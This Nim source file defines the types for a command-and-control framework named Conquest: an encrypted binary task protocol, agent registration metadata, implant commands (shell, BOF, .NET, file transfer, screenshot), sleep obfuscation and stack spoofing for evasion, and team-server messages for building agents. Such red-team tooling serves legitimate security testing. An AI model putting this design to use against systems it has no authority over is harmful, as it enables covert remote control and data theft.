import prompt
import tables
import times
import parsetoml
import mummy

# Custom Binary Task structure
const   
    MAGIC* = 0x514E3043'u32     # Magic value: C0NQ
    VERSION* = 1'u8             # Version 1
    HEADER_SIZE* = 48'u8        # 48 bytes fixed packet header size

type 
    PacketType* = enum 
        MSG_TASK = 0'u8
        MSG_RESULT = 1'u8 
        MSG_REGISTER = 2'u8
        MSG_HEARTBEAT = 100'u8

    ArgType* = enum 
        STRING = 0'u8
        INT = 1'u8
        SHORT = 2'u8
        LONG = 3'u8
        BOOL = 4'u8 
        BINARY = 5'u8 

    HeaderFlags* = enum 
        # Flags should be powers of 2 so they can be connected with or operators
        FLAG_PLAINTEXT = 0'u16
        FLAG_ENCRYPTED = 1'u16
        FLAG_COMPRESSED = 2'u16
        FLAG_FRAGMENTED = 4'u16 

    CommandType* = enum 
        CMD_SLEEP = 0'u16
        CMD_SHELL = 1'u16
        CMD_PWD = 2'u16
        CMD_CD = 3'u16
        CMD_LS = 4'u16
        CMD_RM = 5'u16
        CMD_RMDIR = 6'u16
        CMD_MOVE = 7'u16
        CMD_COPY = 8'u16
        CMD_PS = 9'u16
        CMD_ENV = 10'u16 
        CMD_WHOAMI = 11'u16
        CMD_BOF = 12'u16
        CMD_DOWNLOAD = 13'u16
        CMD_UPLOAD = 14'u16
        CMD_SCREENSHOT = 15'u16
        CMD_DOTNET = 16'u16
        CMD_SLEEPMASK = 17'u16

    ModuleType* = enum 
        MODULE_ALL = 1'u32
        MODULE_SLEEP = 2'u32
        MODULE_SHELL = 4'u32 
        MODULE_BOF = 8'u32
        MODULE_DOTNET = 16'u32
        MODULE_FILESYSTEM = 32'u32 
        MODULE_FILETRANSFER = 64'u32
        MODULE_SCREENSHOT = 128'u32
        MODULE_SITUATIONAL_AWARENESS = 256'u32 

    StatusType* = enum 
        STATUS_COMPLETED = 0'u8
        STATUS_FAILED = 1'u8
        STATUS_IN_PROGRESS = 2'u8

    ResultType* = enum 
        RESULT_STRING = 0'u8 
        RESULT_BINARY = 1'u8
        RESULT_NO_OUTPUT = 2'u8

    ConfigType* = enum 
        CONFIG_LISTENER_UUID = 0'u8
        CONFIG_LISTENER_IP = 1'u8 
        CONFIG_LISTENER_PORT = 2'u8
        CONFIG_SLEEP_DELAY = 3'u8  
        CONFIG_PUBLIC_KEY = 4'u8
        CONFIG_PROFILE = 5'u8

    LogType* {.size: sizeof(uint8).} = enum 
        LOG_INFO = " [INFO] "
        LOG_ERROR = " [FAIL] "
        LOG_SUCCESS = " [DONE] "
        LOG_WARNING = " [WARN] "
        LOG_COMMAND = " [>>>>] "
        LOG_OUTPUT = ""
        LOG_INFO_SHORT = " [*] "
        LOG_ERROR_SHORT = " [-] "
        LOG_SUCCESS_SHORT = " [+] "
        LOG_WARNING_SHORT = " [!] "

    SleepObfuscationTechnique* = enum 
        NONE = 0'u8
        EKKO = 1'u8 
        ZILEAN = 2'u8
        FOLIAGE = 3'u8

# Custom iterator for ModuleType, as it uses powers of 2 instead of standard increments
iterator items*(e: typedesc[ModuleType]): ModuleType =
    # yield MODULE_ALL
    yield MODULE_SLEEP
    yield MODULE_SHELL
    yield MODULE_BOF
    yield MODULE_DOTNET
    yield MODULE_FILESYSTEM
    yield MODULE_FILETRANSFER
    yield MODULE_SCREENSHOT
    yield MODULE_SITUATIONAL_AWARENESS

# Encryption 
type    
    Uuid* = uint32
    Bytes* = seq[byte]
    Key* = array[32, byte]
    Iv* = array[12, byte]
    AuthenticationTag* = array[16, byte]
    Key16* = array[16, byte]

# Packet structure
type 
    Header* = object
        magic*: uint32              # [4 bytes ] magic value 
        version*: uint8             # [1 byte  ] protocol version
        packetType*: uint8          # [1 byte  ] message type 
        flags*: uint16              # [2 bytes ] message flags
        size*: uint32               # [4 bytes ] size of the payload body
        agentId*: Uuid              # [4 bytes ] agent id, used as AAD for encryptio
        seqNr*: uint32              # [4 bytes ] sequence number, used as AAD for encryption
        iv*: Iv                     # [12 bytes] random IV for AES256 GCM encryption
        gmac*: AuthenticationTag    # [16 bytes] authentication tag for AES256 GCM encryption

    TaskArg* = object 
        argType*: uint8             # [1 byte  ] argument type
        data*: seq[byte]            # variable length data (for variable data types (STRING, BINARY), the first 4 bytes indicate data length)

    Task* = object 
        header*: Header
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        argCount*: uint8            # [1 byte  ] number of arguments
        args*: seq[TaskArg]         # variable length arguments

    TaskResult* = object 
        header*: Header 
        taskId*: Uuid               # [4 bytes ] task id
        listenerId*: Uuid           # [4 bytes ] listener id
        timestamp*: uint32          # [4 bytes ] unix timestamp
        command*: uint16            # [2 bytes ] command id 
        status*: uint8              # [1 byte  ] success flag 
        resultType*: uint8          # [1 byte  ] result data type (string, binary)
        length*: uint32             # [4 bytes ] result length
        data*: seq[byte]            # variable length result

# Checkin binary structure
type
    Heartbeat* = object 
        header*: Header            # [48 bytes ] fixed header
        listenerId*: Uuid          # [4 bytes  ] listener id
        timestamp*: uint32         # [4 bytes  ] unix timestamp

# Registration binary structure 
type 
    # All variable length fields are stored as seq[byte], prefixed with 4 bytes indicating the length of the following data
    AgentMetadata* = object 
        listenerId*: Uuid
        username*: seq[byte]
        hostname*: seq[byte]
        domain*: seq[byte]
        ip*: seq[byte]
        os*: seq[byte]
        process*: seq[byte]
        pid*: uint32
        isElevated*: uint8
        sleep*: uint32

    AgentRegistrationData* = object
        header*: Header
        agentPublicKey*: Key        # [32 bytes ] Public key of the connecting agent for key exchange
        metadata*: AgentMetadata

# Agent structure
type 
    Agent* = ref object 
        agentId*: string
        listenerId*: string 
        username*: string 
        hostname*: string
        domain*: string
        ip*: string
        os*: string
        process*: string
        pid*: int
        elevated*: bool 
        sleep*: int 
        tasks*: seq[Task]
        firstCheckin*: DateTime
        latestCheckin*: DateTime
        sessionKey*: Key

# Listener structure
type 
    Protocol* {.size: sizeof(uint8).} = enum
        HTTP = "http"

    Listener* = ref object of RootObj
        server*: Server
        listenerId*: string
        address*: string
        port*: int
        protocol*: Protocol

# Context structures
type 
    KeyPair* = object 
        privateKey*: Key 
        publicKey*: Key

    Profile* = TomlValueRef

    Conquest* = ref object
        prompt*: Prompt
        dbPath*: string
        listeners*: Table[string, tuple[listener: Listener, thread: Thread[Listener]]]
        agents*: Table[string, Agent]
        interactAgent*: Agent
        keyPair*: KeyPair
        profile*: Profile
        ws*: WebSocket

    AgentCtx* = ref object
        agentId*: string
        listenerId*: string
        ip*: string
        port*: int
        sleep*: int
        sleepTechnique*: SleepObfuscationTechnique
        spoofStack*: bool
        sessionKey*: Key
        agentPublicKey*: Key
        profile*: Profile
        
# Structure for command module definitions 
type
    Argument* = object 
        name*: string 
        description*: string 
        argumentType*: ArgType
        isRequired*: bool

    Command* = object 
        name*: string
        commandType*: CommandType
        description*: string 
        example*: string 
        arguments*: seq[Argument]
        dispatchMessage*: string
        execute*: proc(config: AgentCtx, task: Task): TaskResult {.nimcall.}

    Module* = object
        name*: string 
        description*: string
        commands*: seq[Command]

# Definitions for ImGui User interface
type 
    ConsoleItem* = ref object 
        itemType*: LogType
        timestamp*: int64
        text*: string

    ConsoleItems* = ref object
        items*: seq[ConsoleItem]

#[
    Client <-> Server WebSocket communication
]#
type 
    WsMessageAction* = enum
        # Sent by client 
        CLIENT_HEARTBEAT = 0'u8             # Basic checkin 
        CLIENT_AGENT_COMMAND = 1'u8               # Instruct TS to send queue a command for a specific agent
        CLIENT_LISTENER_START = 2'u8        # Start a listener on the TS
        CLIENT_LISTENER_STOP = 3'u8         # Stop a listener
        CLIENT_AGENT_BUILD = 4'u8           # Generate an agent binary for a specific listener

        # Sent by team server
        CLIENT_AGENT_BINARY = 100'u8        # Return the agent binary to write to the operator's client machine
        CLIENT_AGENT_CONNECTION = 101'u8    # Notify new agent connection 
        CLIENT_AGENT_CHECKIN = 102'u8       # Update agent checkin
        CLIENT_CONSOLE_LOG = 103'u8         # Add entry to a agent's console 
        CLIENT_EVENT_LOG = 104'u8           # Add entry to the eventlog
        
        CLIENT_CONNECTION = 200'u8          # Return team server profile 

    # Client -> Server 
    WsHeartbeat* = object 
        msgType* = CLIENT_HEARTBEAT         

    WsCommand* = object 
        msgType* = CLIENT_AGENT_COMMAND           
        agentId*: uint32                    
        command*: seq[byte]                 # Command input field in the console window, prefixed with length

    WsListenerStart* = object  
        msgType* = CLIENT_LISTENER_START    
        listener*: Listener

    WsListenerStop* = object 
        msgType* = CLIENT_LISTENER_STOP     
        listenerId*: uint32                 

    WsAgentBuild* = object 
        msgType* = CLIENT_AGENT_BUILD   
        listenerId*: uint32                 
        sleepDelay*: uint32                  
        sleepMask*: SleepObfuscationTechnique
        spoofStack*: uint8  
        modules*: uint64

    # Server -> Client 
    WsAgentBinary* = object
        msgType* = CLIENT_AGENT_BINARY 
        agentPayload*: seq[byte]            # Agent binary in byte-form, opens file browser to select location on the client

    WsAgentConnection* = object
        msgType* = CLIENT_AGENT_CONNECTION
        agent*: Agent                      
    
    WsAgentCheckin* = object 
        msgType* = CLIENT_AGENT_CHECKIN
        agentId*: uint32                   
        timestamp*: uint32

    WsConsoleLog* = object 
        msgType* = CLIENT_CONSOLE_LOG
        agentId*: uint32 
        logType*: LogType
        timestamp*: uint32 
        data*: seq[byte]

    WsEventLog* = object 
        msgType* = CLIENT_EVENT_LOG
        logType*: LogType
        timestamp*: uint32 
        data*: seq[byte]

    WsClientConnection* = object 
        msgType* = CLIENT_CONNECTION
        version: uint8
        profile*: seq[byte]
        agents*: seq[Agent]
        listeners*: seq[Listener] 
    